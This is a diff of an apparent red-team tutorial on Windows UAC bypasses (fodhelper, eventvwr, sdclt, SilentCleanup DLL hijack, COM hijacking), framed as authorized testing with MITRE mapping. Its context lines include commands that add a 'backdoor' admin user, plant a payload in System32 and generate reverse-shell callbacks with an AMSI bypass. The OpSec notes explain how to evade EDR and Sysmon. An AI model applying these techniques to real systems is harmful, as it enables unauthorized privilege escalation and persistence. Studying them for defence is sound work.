@@ -1,11 +1,45 @@
 ---
 title: "AppLocker Bypass: UAC Bypass"
-date: 2026-03-06
-description: "UAC bypass techniques in AppLocker-constrained environments — auto-elevating binaries, COM object hijacking, and token manipulation — with MITRE mapping and blue team detection."
+date: 2026-06-08
+weight: 9
+reading_path: "applocker"
+step: 9
+description: "UAC bypass techniques in AppLocker-constrained environments: auto-elevating binaries, COM object hijacking, and token manipulation, with MITRE mapping."
+verified: "Windows 10/11 Enterprise · Jun 2026"
 tags: ["applocker", "bypass", "uac", "privilege-escalation", "evasion", "windows", "blueteam"]
 ---
 
 > **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1548.002](https://attack.mitre.org/techniques/T1548/002/) (Abuse Elevation Control Mechanism: Bypass User Account Control).
+
+---
+
+## How Does UAC Work?
+
+UAC enforces **integrity levels** on every process in Windows. Think of them as security rings that control what a process can touch:
+
+```
+SYSTEM integrity   ← kernel drivers, critical services
+      │
+HIGH integrity     ← elevated admin processes (after UAC prompt)
+      │
+MEDIUM integrity   ← standard user processes, normal admin sessions  ← you start here
+      │
+LOW integrity      ← sandboxed processes (IE Protected Mode, Edge)
+      │
+UNTRUSTED          ← extremely restricted
+```
+
+When you're logged in as an administrator, your shell runs at **Medium integrity** by default. UAC acts as a gate: to reach High integrity, a UAC consent prompt must be approved.
+
+**Auto-elevation** is the gap we exploit. Some Microsoft-signed binaries carry an application manifest declaring `autoElevate="true"`. Windows trusts these binaries to silently elevate to High integrity without a UAC prompt. The assumption: Microsoft wrote them, they're safe.
+
+```xml
+<!-- manifest snippet from fodhelper.exe -->
+<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
+<autoElevate>true</autoElevate>
+```
+
+If we can hijack what an auto-elevated binary does, via registry redirection, [DLL hijacking](/docs/applocker/dll-hijacking/), or COM object substitution, we execute arbitrary code at High integrity with zero UAC prompts.
 
 ---
 
@@ -52,7 +86,7 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
     Select ConsentPromptBehaviorAdmin, EnableLUA, PromptOnSecureDesktop
 ```
 
-**3. Enable Sysmon**
+**3. Enable [Sysmon](/docs/blueteam/lolbins-hunting/)**
 ```powershell
 .\Sysmon64.exe -accepteula -i sysmon-config.xml
 ```
@@ -114,39 +148,9 @@ Revert between techniques: registry changes from one bypass can bleed into anoth
 
 ---
 
-## How UAC Works
+## Phase 1: Enumeration
 
-UAC enforces **integrity levels** on every process in Windows. Think of them as security rings that control what a process can touch:
-
-```
-SYSTEM integrity   ← kernel drivers, critical services
-      │
-HIGH integrity     ← elevated admin processes (after UAC prompt)
-      │
-MEDIUM integrity   ← standard user processes, normal admin sessions  ← you start here
-      │
-LOW integrity      ← sandboxed processes (IE Protected Mode, Edge)
-      │
-UNTRUSTED          ← extremely restricted
-```
-
-When you're logged in as an administrator, your shell runs at **Medium integrity** by default. UAC acts as a gate: to reach High integrity, a UAC consent prompt must be approved.
-
-**Auto-elevation** is the gap we exploit. Some Microsoft-signed binaries carry an application manifest declaring `autoElevate="true"`. Windows trusts these binaries to silently elevate to High integrity without a UAC prompt. The assumption: Microsoft wrote them, they're safe.
-
-```xml
-<!-- manifest snippet from fodhelper.exe -->
-<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
-<autoElevate>true</autoElevate>
-```
-
-If we can hijack what an auto-elevated binary does, via registry redirection, DLL hijacking, or COM object substitution, we execute arbitrary code at High integrity with zero UAC prompts.
-
----
-
-## Phase 1 — Enumeration
-
-### Tool 1 — Find-AutoElevatedBinaries.ps1
+### Tool 1: Find-AutoElevatedBinaries.ps1
 
 ```powershell {linenos=inline}
 # Find-AutoElevatedBinaries.ps1
@@ -217,7 +221,7 @@ $results | Export-Csv ".\auto_elevated.csv" -NoTypeInformation
 Write-Host "[*] saved → auto_elevated.csv"
 ```
 
-### Tool 2 — Find-UACRegistryGaps.ps1
+### Tool 2: Find-UACRegistryGaps.ps1
 
 For each auto-elevated binary, ProcMon shows which HKCU registry keys it reads that don't exist. This script cross-references a known list and checks which gaps are present on this machine — each writable missing key is a bypass opportunity.
 
@@ -293,11 +297,26 @@ foreach ($entry in $BypassPaths) {
 
 ---
 
-## Bypass 1 — fodhelper.exe (Registry Hijack)
+## Bypass 1: fodhelper.exe (Registry Hijack)
 
 `fodhelper.exe` (Features On Demand Helper) is an auto-elevated binary that manages optional Windows features. During execution it reads `HKCU\Software\Classes\ms-settings\Shell\Open\command` to find a handler. HKCU is always writable by the current user — no admin needed to set keys there.
 
-Write your payload command to that key, launch fodhelper, and Windows runs your command at High integrity without a UAC prompt.
+Write your payload command to that key, launch fodhelper, and Windows runs your command at High integrity without a UAC prompt. This registry-hijack pattern is the template for every auto-elevated-binary bypass:
+
+```mermaid
+sequenceDiagram
+    participant U as User (Medium integrity)
+    participant R as HKCU registry
+    participant F as fodhelper.exe (auto-elevate)
+    participant W as Windows
+    U->>R: Write payload to the ms-settings Shell/Open/command key\n(Default) = command, DelegateExecute = empty
+    U->>F: Launch fodhelper.exe
+    F->>W: autoElevate=true → elevate to High, no UAC prompt
+    F->>R: Read ms-settings handler from HKCU
+    R-->>F: Returns attacker's command
+    F->>W: Execute command at High integrity
+    W-->>U: Elevated process running
+```
 
 ### PowerShell implementation
 
@@ -389,7 +408,7 @@ Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
 
 ---
 
-## Bypass 2 — eventvwr.exe (Registry Hijack)
+## Bypass 2: eventvwr.exe (Registry Hijack)
 
 `eventvwr.exe` (Event Viewer) auto-elevates and reads `HKCU\Software\Classes\mscfile\shell\open\command` to find the handler for `.msc` files. Same pattern — write command, trigger binary, code runs at High integrity.
 
@@ -429,7 +448,7 @@ Remove-Keys
 
 ---
 
-## Bypass 3 — sdclt.exe (App Path Hijack)
+## Bypass 3: sdclt.exe (App Path Hijack)
 
 `sdclt.exe` (Backup and Restore) queries `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe` to locate the Control Panel binary. Redirect it to your payload — sdclt auto-elevates and executes it at High integrity.
 
@@ -481,7 +500,7 @@ Remove-Keys
 
 ---
 
-## Bypass 4 — SilentCleanup Scheduled Task (DLL Hijack)
+## Bypass 4: SilentCleanup Scheduled Task (DLL Hijack)
 
 The `SilentCleanup` scheduled task runs `DismHost.exe` and `cleanmgr.exe` at High integrity without a UAC prompt. It's designed to run silently during maintenance windows. The task inherits the current user's `%PATH%` environment variable. Drop a malicious DLL with the right name into a user-writable directory that appears in PATH before System32, and DiskCleanup loads it at High integrity.
 
@@ -549,7 +568,7 @@ x86_64-w64-mingw32-gcc -shared -o dismcore.dll hijack_base.c \
 
 ---
 
-## Bypass 5 — COM Object Hijacking (ICMLuaUtil)
+## Bypass 5: COM Object Hijacking (ICMLuaUtil)
 
 Several auto-elevated binaries instantiate COM objects. COM object resolution checks HKCU before HKLM, meaning a user-registered COM object shadows the system one without admin rights. Register a malicious COM server in HKCU, trigger the elevated binary that uses it, and your server runs in its High-integrity context.
 
@@ -633,7 +652,7 @@ CMLuaBypass.exe cmd.exe "/c copy C:\Users\Public\payload.exe C:\Windows\System32
 
 ---
 
-## Bypass 6 — IFileOperation COM (Privileged File Copy)
+## Bypass 6: IFileOperation COM (Privileged File Copy)
 
 The `IFileOperation` COM interface runs at the caller's integrity level, but when invoked from within an auto-elevated process context, it inherits High integrity. This lets you copy files to privileged locations (like `C:\Windows\System32\`) without a UAC prompt.
 
@@ -756,7 +775,7 @@ public static class FileOpBypass {
 
 ---
 
-## Bypass 7 — Automated UAC Bypass Framework (C#)
+## Bypass 7: Automated UAC Bypass Framework (C#)
 
 A unified C# framework that enumerates available bypasses and executes the most appropriate one for the current system, with fallback logic.
 
@@ -1007,7 +1026,7 @@ UACBypass.exe --method eventvwr --cmd "cmd /c net user backdoor P@ss123! /add &&
 
 ## Python Payload Generator
 
-Generates ready-to-paste PowerShell bypass commands for each technique, with optional AMSI bypass prepended.
+Generates ready-to-paste PowerShell bypass commands for each technique, with optional [AMSI](/docs/redteam/bypass-amsi/) bypass prepended.
 
 ```python {linenos=inline}
 #!/usr/bin/env python3
@@ -1199,7 +1218,7 @@ python3 uac_bypass_gen.py --lhost 10.10.10.10 --lport 4444 --technique sdclt \
 
 ## OpSec Notes
 
-- **Registry artifacts** — all HKCU-based bypasses leave keys that EDR and Sysmon will catch on EID 13 (RegistryValueSet). Always clean up immediately after the bypass triggers — the scripts above do this automatically.
+- **Registry artifacts** — all HKCU-based bypasses leave keys that [EDR](/docs/redteam/defender-bypass/) and Sysmon will catch on EID 13 (RegistryValueSet). Always clean up immediately after the bypass triggers — the scripts above do this automatically.
 - **Process ancestry** — High-integrity shells spawned from fodhelper or eventvwr will have those binaries as parent processes. `fodhelper.exe → powershell.exe` is a well-known detection pattern. Prefer spawning a sacrificial process and injecting rather than running your C2 directly as a child.
 - **CMLuaUtil** is the quietest option: no HKCU registry writes, no suspicious process parents. The COM invocation can still be caught by ETW.
 - **SilentCleanup** runs on a schedule. You can pre-plant the DLL and wait for the next scheduled run rather than triggering it yourself, which avoids the suspicious `Start-ScheduledTask` call.
